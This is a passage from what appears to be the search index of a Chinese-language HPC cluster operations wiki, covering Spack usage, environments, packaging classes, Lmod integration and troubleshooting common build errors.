\u7ba1\u7406\u7684\u5916\u90e8\u4f9d\u8d56\uff0c\u6bd4\u5982\u7cfb\u7edf\u5305\u7ba1\u7406\u5668\u5b89\u88c5\u7684\u5305\u3002<code>+</code> \u8868\u793a Spack \u7ba1\u7406\u7684\u4f9d\u8d56\uff0c<code>-</code> \u8868\u793a Spack \u5c06\u8981\u5b89\u88c5\u7684\u5305\u3002</p> <p>\u6982\u5ff5\uff1a\u4f7f\u5177\u4f53\u5316\uff08concretize\uff09</p> <p>Spack \u5b89\u88c5\u8f6f\u4ef6\u5305\u9700\u8981\u7ecf\u8fc7 concretize \u548c install \u4e24\u4e2a\u6b65\u9aa4\u3002concretize \u662f\u6307\u786e\u5b9a\u8f6f\u4ef6\u5305\u7684\u4f9d\u8d56\u5173\u7cfb\uff0c\u751f\u6210 spec \u6811\uff0c\u7136\u540e\u6839\u636e spec \u6811\u5b89\u88c5\u8f6f\u4ef6\u5305\u3002</p> <p><code>spack spec</code> \u6267\u884c\u7684\u5c31\u662f concretize \u64cd\u4f5c\u3002</p> <p>\u66f4\u591a\u4fe1\u606f\u5efa\u8bae\u9605\u8bfb\uff1aCSCS Spack Course 2024\u3002</p> <p>\u4f7f\u7528 <code>spack list</code> \u53ef\u4ee5\u67e5\u8be2\u5728\u7ebf\u4ed3\u5e93\u4e2d\u7684\u8f6f\u4ef6\u5305\uff0c\u4f7f\u7528 <code>spack info</code>\u00a0\u53ef\u4ee5\u67e5\u770b\u8f6f\u4ef6\u5305\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p>\u6982\u5ff5\uff1a\u865a\u5305\uff08Virtual Packages\uff09</p> <p>\u6bd4\u5982 OpenMPI\u3001IntelMPI\u3001MPICH\uff0c\u5b83\u4eec\u662f MPI \u7684\u4e0d\u540c\u5b9e\u73b0\u3002\u56e0\u6b64\u5b83\u4eec\u90fd\u63d0\u4f9b\u4e00\u4e2a\u865a\u5305 mpi\uff0c\u5176\u4ed6\u7a0b\u5e8f\u53ea\u4f1a\u4f9d\u8d56\u4e8e mpi \u8fd9\u4e2a\u5305\uff0c\u800c\u4e0d\u4f1a\u4f9d\u8d56\u4e8e\u67d0\u4e2a\u5177\u4f53\u5b9e\u73b0\u3002 \u4f7f\u7528 <code>spack info --all</code>\u00a0\u53ef\u4ee5\u67e5\u770b\u63d0\u4f9b\u7684\u865a\u5305\uff0c\u8fd9\u91cc\u4ee5 ATLAS \u4e3a\u4f8b\uff0c\u53ef\u4ee5\u770b\u5230\uff1a</p> <pre><code>Virtual Packages:\n    atlas provides blas, lapack, lapack@3.6.1\n</code></pre> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c <code>atlas</code>\u00a0\u4f1a\u81ea\u52a8\u53d6\u4ee3 <code>blas/lapack</code>\u00a0\u7b49\u7684\u4f4d\u7f6e\uff0c\u63d0\u4f9b\u5b83\u4eec\u7684\u670d\u52a1\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#\u5176\u5b83\u5e38\u7528\u547d\u4ee4","title":"\u5176\u5b83\u5e38\u7528\u547d\u4ee4","text":"<ul> <li>\u6bd4\u8f83 spec \u5dee\u5f02\uff1a<code>spack diff</code></li> <li>\u67e5\u627e\u5b89\u88c5\u4f4d\u7f6e\uff1a<code>spack location --install-dir &lt;spec&gt;</code></li> <li>\u79fb\u52a8\u5230\u5b89\u88c5\u4f4d\u7f6e\uff1a<code>spack cd -i &lt;spec&gt;</code></li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#\u521b\u5efa\u548c\u4f7f\u7528-spack-\u73af\u5883\u8be5\u90e8\u5206\u9700\u8981\u5b8c\u5584","title":"\u521b\u5efa\u548c\u4f7f\u7528 Spack \u73af\u5883\uff08\u8be5\u90e8\u5206\u9700\u8981\u5b8c\u5584\uff09","text":"<p>Quote</p> <ul> <li>Environments Tutorial \u2014 Spack Tutorial documentation</li> <li>Environments (spack.yaml, spack.lock) \u2014 Spack documentation</li> </ul> <p>\u521b\u5efa\u73af\u5883\u7684\u57fa\u7840\u6b65\u9aa4\u3001\u67e5\u627e\u5916\u90e8\u4f9d\u8d56\u3001\u7f16\u8bd1\u5668\u7b49\uff1a</p> <pre><code>spack env list\nspack env create myenv\nspack env activate -p myenv\nspack env status\nspack external find\nspack compiler find\n</code></pre> <p>\u5728 Spack Environment \u4e2d\uff0cadd spec\u3001concretize \u548c install \u4e09\u4e2a\u6b65\u9aa4\u5206\u79bb\u5f00\u6765\uff0c\u6bcf\u4e00\u4e2a\u9636\u6bb5\u5f04\u597d\u518d\u6267\u884c\u4e0b\u4e00\u4e2a\u9636\u6bb5\u3002\u8fd9\u6837\u786e\u5b9e\u80fd\u51cf\u5c11\u76f4\u63a5\u5b89\u88c5\u540e\u53d1\u73b0\u914d\u7f6e\u4e0d\u5bf9\u53c8\u8981\u91cd\u65b0\u5f04\u7684\u9ebb\u70e6\u3002</p> <ul> <li>add/remove \u73af\u5883\u4e2d\u7684 spec\uff08\u6b64\u65f6\u4e0d\u4f1a\u5b89\u88c5\u4e5f\u4e0d\u4f1a\u68c0\u67e5 spec \u662f\u5426\u6709\u9519\uff09\uff1a</li> </ul> <pre><code>spack add &lt;some packages&gt;\nspack remove &lt;some packages&gt;\n</code></pre> <ul> <li>concretize \u73af\u5883\u4e2d\u7684 spec\uff08\u6784\u5efa\u4f9d\u8d56\u6811\uff09\uff1a</li> </ul> <pre><code>spack concretize\nspack find -c\n</code></pre> <ul> <li>\u5b89\u88c5\u73af\u5883\u4e2d\u7684 spec\uff08\u5b89\u88c5\u6240\u6709 spec\uff09\uff1a</li> </ul> <pre><code>spack install\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#\u5904\u7406\u5934\u6587\u4ef6\u548c\u4f9d\u8d56","title":"\u5904\u7406\u5934\u6587\u4ef6\u548c\u4f9d\u8d56","text":"<p>Quote</p> <ul> <li>Drop *_INCLUDE_PATH in prefix_inspections:include by haampie \u00b7 Pull Request #21699 \u00b7 spack/spack</li> <li>Customize environment modifications \u2014 Spack documentation</li> <li>Environment Variables (The C Preprocessor) - GCC Documentation</li> <li>LD_LIBRARY_PATH \u2013 or: How to get yourself into trouble!</li> </ul> <p>Spack \u53ea\u4f1a\u7ef4\u62a4\u4e0b\u9762\u7684\u73af\u5883\u53d8\u91cf\uff1a</p> <pre><code>PATH\nMANPATH\nACLOCAL_PATH\nPKG_CONFIG_PATH\nCMAKE_PREFIX_PATH\nDYLD_FALLBACK_LIBRARY_PATH on macOS\n</code></pre> <p>\u5982\u679c\u52a0\u8f7d\u7684\u5305\u662f\u7f16\u8bd1\u5668\uff08\u5982 <code>nvhpc</code>\u3001<code>intel-oneapi-compilers</code> \u7b49\uff09\uff0c\u8fd8\u4f1a\u4fee\u6539\u7f16\u8bd1\u5668\u53d8\u91cf\u548c\u52a8\u6001\u94fe\u63a5\u5e93\u8def\u5f84\uff1a</p> <pre><code>CC CXX FC F77\nLD_LIBRARY_PATH\n</code></pre> <p>\u5176\u4ed6\u60c5\u51b5\u4e0b\u4e00\u822c\u4e0d\u4f1a\u4fee\u6539\u5934\u6587\u4ef6\u548c\u52a8\u6001\u94fe\u63a5\u5e93\u641c\u7d22\u8def\u5f84\uff1a</p> <pre><code>CPATH\nC_INCLUDE_PATH\nCPLUS_INCLUDE_PATH\nLD_LIBRARY_PATH\n</code></pre> <p>\u5728\u76f8\u5173\u6587\u6863\u548c Pull Request \u4e2d\u53ef\u4ee5\u4e86\u89e3\u539f\u56e0\uff1a</p> <p>Spack \u793e\u533a\u8ba4\u4e3a\u73af\u5883\u53d8\u91cf\u4e0d\u591f\u900f\u660e\uff0c\u4f5c\u4e3a\u4e00\u79cd\u7ba1\u7406\u9009\u9879\u7684\u65b9\u5f0f\u4e5f\u5341\u5206\u5371\u9669\uff08\u9020\u6210\u8fc7\u67d0\u4e9b\u7f16\u8bd1\u5668 bug\uff09\uff0c\u66f4\u52a0\u9f13\u52b1\u7528\u6237\u663e\u5f0f\u4f7f\u7528\u7f16\u8bd1\u5668\u9009\u9879\u5982 <code>-I$(spack location -i &lt;spec&gt;)/include</code>\u3002</p> <p>\u73b0\u4ee3\u6784\u5efa\u5de5\u5177\uff08\u5982 CMake\u3001pkg-config\uff09\u5df2\u7ecf\u80fd\u591f\u5f88\u597d\u5730\u5904\u7406\u5934\u6587\u4ef6\u641c\u7d22\u8def\u5f84\uff0c\u79fb\u9664\u540e\u7528\u6237\u4ecd\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u624b\u52a8\u6dfb\u52a0\u8fd9\u4e9b\u8def\u5f84\u3002</p> <p>Spack \u5c06\u7ef4\u62a4\u73af\u5883\u53d8\u91cf\u7684\u81ea\u4e3b\u9009\u62e9\u4ea4\u7ed9\u7528\u6237\u548c\u7cfb\u7edf\u7ba1\u7406\u5458\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>modules.yaml</code> \u6307\u5b9a\u4fee\u6539\u73af\u5883\u53d8\u91cf\u3002</p> <p>\u5982\u679c\u6211\u4eec\u9700\u8981\u5305\u542b\u6216\u5f15\u7528 Spack \u7ba1\u7406\u7684\u5305\uff0c\u6709\u4ee5\u4e0b\u51e0\u79cd\u65b9\u5f0f\uff1a</p> <ul> <li> <p>\u4f7f\u7528 <code>spack location -i &lt;spec&gt;</code>\uff1a</p> <p>\u5148 <code>spack cd -i &lt;spec&gt;</code>\u00a0\u8fdb\u5165\u5b89\u88c5\u76ee\u5f55\uff0c\u4f7f\u7528 <code>fdfind | fzf</code> \u7b49\u5de5\u5177\u641c\u7d22\u5934\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84\uff0c\u7136\u540e\u6dfb\u52a0\u5230\u7f16\u8bd1\u9009\u9879\u4e2d\u3002\u4f8b\u5982\uff1a</p> <pre><code>C_INCLUDE_PATH=$(spack location -i &lt;spec&gt;)/include make\n</code></pre> </li> <li> <p>\u4f7f\u7528 pkg-config\uff1a</p> <p><code>pkg-config</code> \u662f\u4e00\u4e2a\u7ba1\u7406\u5e93\u6587\u4ef6\u548c\u5934\u6587\u4ef6\u8def\u5f84\u7684\u5de5\u5177\u3002\u5b83\u4f1a\u641c\u7d22 <code>PKG_CONFIG_PATH</code>\u00a0\u4e2d\u7684 <code>.pc</code> \u6587\u4ef6\uff0c\u6309\u6307\u5b9a\u8981\u6c42\u8fd4\u56de\u7f16\u8bd1\u9009\u9879\u3002</p> <p>Spack \u90e8\u5206\u5305\u52a0\u8f7d\u65f6\u4f1a\u4fee\u6539 <code>PKG_CONFIG_PATH</code>\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>pkg-config</code>\u00a0\u6765\u83b7\u53d6\u5934\u6587\u4ef6\u548c\u5e93\u6587\u4ef6\u7684\u8def\u5f84\u3002\u4f8b\u5982\uff1a</p> <pre><code>c++ example.cpp $(pkg-config --cflags --libs gtk+-3.0 webkit2gtk-4.0) -o example\n</code></pre> <p><code>pkg-config</code>\u00a0\u652f\u6301 <code>--static</code>\u3001<code>--shared</code> \u7b49\u9009\u9879\uff0c\u53ef\u4ee5\u6307\u5b9a\u94fe\u63a5\u9759\u6001\u5e93\u6216\u52a8\u6001\u5e93\u3002</p> </li> <li> <p>\u4f7f\u7528 CMake\uff1a</p> <p>Spack \u90e8\u5206\u5305\u52a0\u8f7d\u65f6\u4f1a\u4fee\u6539 <code>CMAKE_PREFIX_PATH</code>\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>find_package</code>\u00a0\u6765\u67e5\u627e\u5934\u6587\u4ef6\u548c\u5e93\u6587\u4ef6\u3002\u4f8b\u5982\uff1a</p> <pre><code>find_package(OpenMP)\n</code></pre> </li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#\u5e38\u7528\u8f6f\u4ef6\u5305","title":"\u5e38\u7528\u8f6f\u4ef6\u5305","text":"<pre><code># \u5f00\u6e90\u7f16\u8bd1\u548c\u6784\u5efa\u7cfb\u7edf\nllvm gcc\n# NVIDIA\ncuda\nnvidia-nsight-systems\nnvhpc # \u5305\u542b\u4e0a\u9762\u4e24\u8005\n# intel: intel-oneapi-*\nintel-oneapi-compilers\nintel-oneapi-mkl\nintel-oneapi-mpi\nintel-oneapi-vtune\nintel-oneapi-tbb\n# amd\naocc+license-agreed\n# MPI\nmpich mvapich2 openmpi\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#spack-\u914d\u7f6e\u4e0e\u7ba1\u7406","title":"Spack \u914d\u7f6e\u4e0e\u7ba1\u7406","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#\u6dfb\u52a0\u7cfb\u7edf\u5df2\u6709\u7684\u5305","title":"\u6dfb\u52a0\u7cfb\u7edf\u5df2\u6709\u7684\u5305","text":"<ul> <li> <p>\u914d\u7f6e\u7f16\u8bd1\u5668 <code>spack compiler</code></p> <ul> <li><code>list</code> <code>add=find</code> <code>info</code></li> <li><code>spack config edit compilers</code>\u00a0\u53ef\u4ee5\u8fdb\u4e00\u6b65\u6307\u5b9a\u7f16\u8bd1\u9009\u9879\u3001\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u3002</li> </ul> </li> <li> <p><code>spack external find</code> \u81ea\u52a8\u626b\u63cf\u7cfb\u7edf\u4e2d\u5df2\u6709\u7684\u5305 Automatically Find External Packages</p> </li> <li><code>spack config edit packages</code>\u00a0\uff0c\u4ee5 CUDA \u4e3a\u4f8b\uff1a</li> </ul> <pre><code>packages:\n  all:\n    variants: +cuda cuda_arch=80\n  cuda:\n    externals:\n    - spec: \"cuda@12.3%gcc@12.2.0 arch=linux-debian12-x86_64\"\n      prefix: /usr/local/cuda-12.3\n      extra_attributes:\n        environment:\n          prepend_path:\n            LD_LIBRAY_PATH: /usr/local/cuda-12.3/lib64\n</code></pre> <ul> <li>Spack \u5efa\u8bae\u5982\u679c\u7cfb\u7edf\u4e2d\u6709\u8fd9\u4e9b\u5305\u5c31\u5199\u8fdb\u53bb\uff1a <code>openssl</code> <code>git</code>\u00a0\u3002\u8fd9\u4e9b\u5305\u786e\u5b9e\u5f88\u591a\u7cfb\u7edf\u90fd\u6709\u9644\u5e26\uff0c\u76f4\u63a5\u4f7f\u7528\u53ef\u4ee5\u8282\u7701\u4e00\u4e9b\u7f16\u8bd1\u65f6\u95f4\u3002\u5f53\u7136\u5f88\u591a\u65f6\u5019\u6211\u4eec\u7528 Spack \u5c31\u662f\u4e0d\u60f3\u81ea\u5df1\u89e3\u51b3\u4f9d\u8d56\uff0c\u5e0c\u671b\u4e00\u884c\u547d\u4ee4\u89e3\u51b3\u6240\u6709\u4e8b\u60c5\uff0c\u5168\u90fd\u8ba9 Spack \u81ea\u5df1\u88c5\u4e00\u5957\u4e5f\u884c\u3002</li> </ul> <p>\u6709\u4e9b\u5305\u5fc5\u987b\u4f7f\u7528\u53d1\u884c\u7248\u63d0\u4f9b\u7684\u7248\u672c</p> <p>\u6bd4\u5982 OpenSSL\uff0c\u5982\u679c\u7248\u672c\u4e0d\u4e00\u81f4\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4 SSH \u8fde\u63a5\u5931\u8d25\u3002\u8fd9\u5c06\u76f4\u63a5\u5bfc\u81f4 MPI \u7a0b\u5e8f\u65e0\u6cd5\u8fd0\u884c\u3002</p> <p></p> <p>\u5bf9\u4e8e OpenSSL \u8fd9\u79cd\u57fa\u7840\u5305\uff0c\u6bcf\u4e2a\u7cfb\u7edf\u5e94\u5f53\u56fa\u5b9a\u7248\u672c\uff0c\u4e0d\u8981\u8ba9 Spack \u81ea\u884c\u7f16\u8bd1\uff0c\u5f88\u53ef\u80fd\u53d1\u751f\u7248\u672c\u4e0d\u4e00\u81f4\u95ee\u9898\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#\u4e0e-lmod-\u96c6\u6210","title":"\u4e0e Lmod \u96c6\u6210","text":"<ul> <li> <p>\u914d\u7f6e\u81ea\u52a8\u4e3a\u6240\u6709\u5b89\u88c5\u7684\u5305\u751f\u6210 modulefile\uff1a</p> <pre><code>spack config --scope=site add modules:default:enable:[lmod]\n</code></pre> </li> <li> <p>\u5728 <code>/etc/lmod/.modulespath</code>\u00a0\u4e2d\u6dfb\u52a0 Spack \u7684 modulefile \u8def\u5f84\uff1a</p> <pre><code>echo \"/opt/apps/spack/share/spack/lmod\" &gt;&gt; /etc/lmod/.modulespath\n</code></pre> </li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#spack-\u8f6f\u4ef6\u5305\u7ef4\u62a4","title":"Spack \u8f6f\u4ef6\u5305\u7ef4\u62a4","text":"<p>Quote</p> <ul> <li>Packaging Guide: defining a package \u2014 Spack documentation</li> </ul> <p>Spack \u6253\u5305\u7cfb\u7edf\u6574\u4f53\u6bd4\u8f83\u590d\u6742\uff0c\u8fd9\u91cc\u6211\u4eec\u4ec5\u4ecb\u7ecd\u57fa\u672c\u6982\u5ff5\uff0c\u4fa7\u91cd\u4e8e\u6784\u5efa\u76f8\u5173\uff0c\u4f7f\u8bfb\u8005\u6709\u80fd\u529b\u4fee\u6539\u73b0\u6709\u7684\u8f6f\u4ef6\u5305\u3002</p> <p>\u5728 Spack \u4e2d\uff0c\u6bcf\u4e2a Package \u5c31\u662f\u4e00\u4e2a\u7c7b\uff0c\u5f62\u6210\u7ee7\u627f\u5173\u7cfb\uff1a</p> <pre><code>flowchart\n n1[\"PackageBase\"]\n n2[\"AutotoolsPackage\"]\n n1 --- n2\n n3[\"CudaPackage\"]\n n1 --- n3\n n4[\"MpichEnvironmentModifications\"]\n n1 --- n4\n n5[\"Mvapich2\"]\n n2 --- n5\n n3 --- n5\n n4 --- n5\n n6[\"ROCmPackage\"]\n n1 --- n6\n n6 --- n5</code></pre> <p>Package \u7c7b\u7684\u4ee3\u7801\u6709\u8fd9\u4e48\u51e0\u7c7b\uff1a</p> <ul> <li> <p>\u5143\u6570\u636e\uff1a</p> <pre><code>homepaage = \"...\"\nversion(\"2.4.0\", sha256=\"...\")\nvariant(\"feature\", default=True, description=\"...\")\n</code></pre> </li> <li> <p>\u8865\u4e01\uff1a</p> <pre><code>patch(\"patchfile.patch\", when=\"@1.2: +feature\")\ndef patch(self):\n    ...  # \u81ea\u5b9a\u4e49\u8865\u4e01\n</code></pre> </li> <li> <p>\u4f9d\u8d56\u5173\u7cfb\uff1a</p> <pre><code>depends_on(\"libelf@0.8 +parser +pic\",\n    when=\"@1.2: +feature\",\n    type=(\"build\", \"link\", \"run\", \"test\"),\n    patches=[\"patchfile.patch\",\n        patch(\"https://github.com/spack/spack/pull/1234.patch\",\n            when=\"@1.2: +feature\")]\n    )\nprovides()\nconflicts()\nrequires()\nsetup_dependent_pacakge()\n</code></pre> <p>\u9ed8\u8ba4\u4e3a <code>type=(\"build\",\"link\")</code>\u3002\u4e0d\u540c\u7684\u4f9d\u8d56\u5173\u7cfb\u5c06\u5728\u5305\u7684\u4e0d\u540c\u9636\u6bb5\u8d77\u4f5c\u7528\uff0c\u4e3b\u8981\u662f\u5f71\u54cd <code>PATH</code> \u548c\u7f16\u8bd1\u3001\u94fe\u63a5\u5668\u9009\u9879\u3002</p> <p>\u8fd9\u4e9b\u6307\u4ee4\u53ef\u4ee5\u7528 <code>with</code> \u8bed\u53e5\u6765\u6279\u91cf\u7ba1\u7406\uff1a</p> <pre><code>with default_args(type=(\"build\",\"run\"), when(\"...\")):\n    depends_on(\"...\")\n    conflicts(\"...\")\n</code></pre> </li> <li> <p>\u6807\u51c6\u63a5\u53e3\uff1a</p> <p>\u4e3b\u8981\u662f\u4f9b\u4f9d\u8d56\u4f7f\u7528\u3002</p> <pre><code>def libs(self): # \u5e93\u540d\ndef command(self): # \u53ef\u6267\u884c\u6587\u4ef6\ndef headers(self): # \u5934\u6587\u4ef6\u76ee\u5f55\ndef home(self): # \u5b89\u88c5\u4f4d\u7f6e\n</code></pre> </li> <li> <p>\u6784\u5efa\u3001\u5b89\u88c5\u6b65\u9aa4\uff1a</p> <p>\u6839\u636e\u4e0d\u540c\u7684\u6784\u5efa\u7cfb\u7edf\uff0c\u5b9e\u73b0\u4e0d\u540c\u7684\u51fd\u6570\u3002</p> <pre><code># before build\ndef setup_build_environment(self, env):\n    env.set(\"CXX\", \"g++\")\n@run_before(\"cmake\") \n\n# build\ndef cmake_args(self): # CMakePackage\n    self.spec[\"dependecy\"].prefix\ndef configure_args(self): # AutotoolsPackage\n    args = []\n    if self.spec.satisfies(\"+feature\"):\n        args.append(\"--enable-feature\")\n        args.append(f\"--with-libxml2={self.spec['libxml2'].prefix}\")\n    return args\ndef build_targets(self): # MakefilePackage\ndef install_targets(self): # MakefilePackage\n\n# after build\ndef install_missing_files(self):\n    install_tree(\"extra_files\", self.prefix.bin)\n@run_after(\"install\", when=\"...\")\n</code></pre> </li> <li> <p>\u73af\u5883\u7ba1\u7406\uff1a</p> <p>\u53ef\u4ee5\u7ba1\u63a7\u4e0d\u540c\u9636\u6bb5\u3001\u4f9d\u8d56\u5173\u7cfb\u4e0a\u7684\u73af\u5883\u53d8\u91cf\uff1a</p> <pre><code>setup_build_environment(env, spec)\nsetup_dependent_build_environment(env, dependent_spec)\nsetup_run_environment(env)\nsetup_dependent_run_environment(env, dependent_spec)\n</code></pre> </li> </ul> <p>Spack \u5b89\u88c5\u8f6f\u4ef6\u5305\u7684\u5927\u81f4\u8fc7\u7a0b\uff1a</p> <ul> <li>Fetch</li> <li>Extract to stage directory</li> <li> <p>Fork build environment</p> <p>Spack \u4f1a\u6e05\u7a7a\u53ef\u80fd\u5f71\u54cd\u6784\u5efa\u7684\u73af\u5883\u53d8\u91cf\uff0c\u6784\u5efa\u8fc7\u7a0b\u4e0e\u4e3b\u8fdb\u7a0b\u4e92\u4e0d\u5e72\u6270\u3002</p> </li> <li> <p>Execute (build system specific)</p> <ul> <li>configure</li> <li>build</li> <li>install</li> </ul> </li> </ul> <p>\u8c03\u8bd5\u6784\u5efa\u73af\u5883</p> <p>\u6709\u65f6\u9700\u8981\u624b\u52a8\u590d\u73b0 Spack \u6784\u5efa\u8fc7\u7a0b\u4e2d\u7684\u547d\u4ee4\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6062\u590d\u73af\u5883\uff1a</p> <pre><code># \u5931\u8d25\u65f6\u4e0d\u6e05\u9664 prefix\uff08\u4e00\u822c\u7528\u4e8e install \u9636\u6bb5\u7684\u8c03\u8bd5\uff09\nspack install --keep-prefix --verbose &lt;package&gt;\n# \u5931\u8d25\u65f6\u5305\u7684\u4f4d\u7f6e\u5c31\u662f stage\nspack locate &lt;package&gt;\nspack cd &lt;pacakge&gt;\nspack build-env &lt;package&gt; -- /bin/sh\n</code></pre> <p>\u5176\u4ed6\u6709\u7528\u7684\u547d\u4ee4\uff1a</p> <pre><code># \u6210\u529f\u5b89\u88c5\u540e\u4fdd\u7559 stage\nspack install --keep-stage &lt;spec&gt;\n# \u6e05\u7406 stage\nspack clean --stage\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#\u5e38\u89c1\u95ee\u9898","title":"\u5e38\u89c1\u95ee\u9898","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#\u653e\u5f03\u8fc7\u4e8e\u8001\u65e7\u7684\u5305","title":"\u653e\u5f03\u8fc7\u4e8e\u8001\u65e7\u7684\u5305","text":"<p>\u6784\u5efa\u8fc7\u7a0b\u7684\u5f88\u591a\u9519\u8bef\u5f80\u5f80\u662f\u56e0\u4e3a\u4ee3\u7801\u592a\u8001\u3001\u4e0d\u7b26\u5408\u65b0\u7684\u8bed\u6cd5\u89c4\u8303\u3001\u529f\u80fd\u5f03\u7528\u3002\u5982\u679c\u6709\u53ef\u80fd\uff0c\u4e0d\u8981\u518d\u4f7f\u7528\u8be5\u5305\uff0c\u9009\u62e9\u65b0\u7684\u53ef\u66ff\u4ee3\u7684\u5305\uff0c\u4e0d\u7136\u53ef\u80fd\u9700\u8981\u82b1\u5f88\u5927\u7cbe\u529b\u8c03\u6574\u7f16\u8bd1\u9009\u9879\u3002\u6bd4\u5982 ATLAS\uff0c\u5176\u7a33\u5b9a\u7684\u5305\u5df2\u7ecf\u662f 2016 \u5e74\u7684\u4e86\uff0c\u7f16\u8bd1\u65f6\u7206\u51fa\u4e86\u5f88\u591a\u5f03\u7528\u7684\u51fd\u6570\u3001\u4e0d\u80fd\u8bc6\u522b\u76ee\u524d\u7684 CPU \u7b49\u7b49\u95ee\u9898\uff0c\u56e0\u6b64\u8fd8\u662f\u653e\u5f03\u8be5\u5305\u6bd4\u8f83\u597d\u3002</p> <p></p> <p>\u5bf9\u4e8e BLAS\uff0c\u5176\u5b9e\u5b98\u7f51\u63d0\u4f9b\u4e86 Vendor-Specific \u7684\u5217\u8868\uff0c\u53ef\u4ee5\u627e\u5230\uff1aintel-oneapi-mkl \u5c31\u662f Intel \u5e73\u53f0\u4e0a\u7684\u4f18\u5316\u5b9e\u73b0\uff0c\u7528\u5b83\u5373\u53ef\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#\u81ea\u884c\u6dfb\u52a0\u7f16\u8bd1\u94fe\u63a5\u9009\u9879","title":"\u81ea\u884c\u6dfb\u52a0\u7f16\u8bd1\u3001\u94fe\u63a5\u9009\u9879","text":"<p>\u8fd9\u4e9b\u95ee\u9898\u5e38\u5e38\u662f\u7531\u4e8e\u7f16\u5199\u5b89\u88c5\u811a\u672c\u7684\u4eba\u6ca1\u6709\u8003\u8651\u5b8c\u5584\u5bfc\u81f4\u7684\uff0c\u6ca1\u6709\u6307\u5b9a\u94fe\u63a5\u67d0\u4e9b\u5e93\uff0c\u5bfc\u81f4\u7f16\u8bd1\u8fc7\u7a0b\u4e2d\u65ad\u3002\u5982\u679c\u5bf9 <code>ld</code>\u00a0\u7b49\u94fe\u63a5\u5de5\u5177\u719f\u6089\uff0c\u5c31\u80fd\u591f\u81ea\u884c\u6dfb\u52a0\u76f8\u5e94\u7684\u9009\u9879\u5b8c\u6210\u7f16\u8bd1\u3002\u4e0b\u9762\u8bb0\u5f55\u51e0\u4e2a\u4f8b\u5b50\uff1a</p> <pre><code>spack install hwloc@2.9.1%oneapi ^intel-oneapi-mpi%oneapi\n</code></pre> <p>\u4f7f\u7528 <code>intel-oneapi-mpi</code>\u00a0\u4f9d\u8d56\u5b89\u88c5 <code>hwloc</code>\u00a0\uff0c\u63d0\u793a\u7f3a\u5c11 MPI \u76f8\u5173\u7b26\u53f7\uff0c\u5f88\u663e\u7136\u662f\u6ca1\u94fe\u63a5 MPI \u5e93\u3002</p> <p></p> <ul> <li>\u9996\u5148\u68c0\u67e5 786 \u884c\u7684\u7f16\u8bd1\u547d\u4ee4\uff0c\u5176\u5b9e\u8fd9\u91cc\u5e76\u6ca1\u6709\u6307\u5b9a\u94fe\u63a5 MPI \u5e93\uff0c\u56e0\u6b64\u5e94\u5f53\u6dfb\u52a0 <code>-lmpi</code>\u00a0\u9009\u9879\u3002\u66f4\u6539\u4e3a\uff1a</li> </ul> <pre><code>spack install hwloc@2.9.1%oneapi ldflags=\"-lmpi\" ^intel-oneapi-mpi%oneapi\n</code></pre> <ul> <li>\u8fd9\u4e2a\u95ee\u9898\u6298\u817e\u4e86\u6211\u4e00\u4e2a\u591a\u5c0f\u65f6\uff0c\u624d\u6162\u6162\u627e\u5230\u4e0a\u9762\u8fd9\u4e2a\u95ee\u9898\u3002\u4e00\u5f00\u59cb\u6211\u8ba4\u4e3a\u53ef\u80fd\u662f\u8def\u5f84\u7f3a\u5931\uff0c\u56e0\u6b64\u5c1d\u8bd5\u4ee5\u5404\u79cd\u65b9\u5f0f\u4e3a <code>ld</code>\u00a0\u6dfb\u52a0\u641c\u7d22\u8def\u5f84\uff0c\u4f46\u6700\u540e\u53d1\u73b0\u5b83\u6839\u672c\u6ca1\u6307\u5b9a\u94fe\u63a5\u3002</li> <li>\u5982\u679c\u662f\u8def\u5f84\u95ee\u9898\uff0c <code>ld</code>\u00a0\u7684\u62a5\u9519\u5e94\u8be5\u662f\u627e\u4e0d\u5230\u67d0\u4e2a\u5e93\uff0c\u800c\u4e0d\u662f\u672a\u5b9a\u4e49\u7b26\u53f7\uff0c\u6bd4\u5982\uff1a</li> </ul> <pre><code>/usr/bin/ld: cannot find -lzlib\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#error-all-fetchers-failed-for","title":"Error: All fetchers failed for","text":"<p>\u7f51\u7edc\u95ee\u9898\u3002\u6709\u4e9b\u5305\u9700\u8981\u4ece GitHub \u7b49\u5730\u62c9\u53d6\u8d44\u6e90\u3002\u52a0\u4e0a\u4ee3\u7406\u89e3\u51b3\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/system/","title":"\u7cfb\u7edf\u8fd0\u7ef4","text":""},{"location":"operation/system/#\u7cfb\u7edf\u8fd0\u7ef4","title":"\u7cfb\u7edf\u8fd0\u7ef4","text":"<p>\u7cfb\u7edf\u8fd0\u7ef4\u8d1f\u8d23\u96c6\u7fa4\u67b6\u6784\u7684\u8bbe\u8ba1\u548c\u7ef4\u62a4\u3002\u7cfb\u7edf\u8fd0\u7ef4\u89e3\u51b3\u7684\u95ee\u9898\u662f\uff1a</p> <ul> <li>\u8003\u8651\u6570\u5341\u53f0\u7269\u7406\u670d\u52a1\u5668\uff0c\u5982\u4f55\u7ba1\u7406\u5b83\u4eec\uff1f</li> <li>\u7528\u6237\u8d26\u6237\u3001\u6570\u636e\u5b58\u50a8\u600e\u4e48\u505a\uff1f</li> 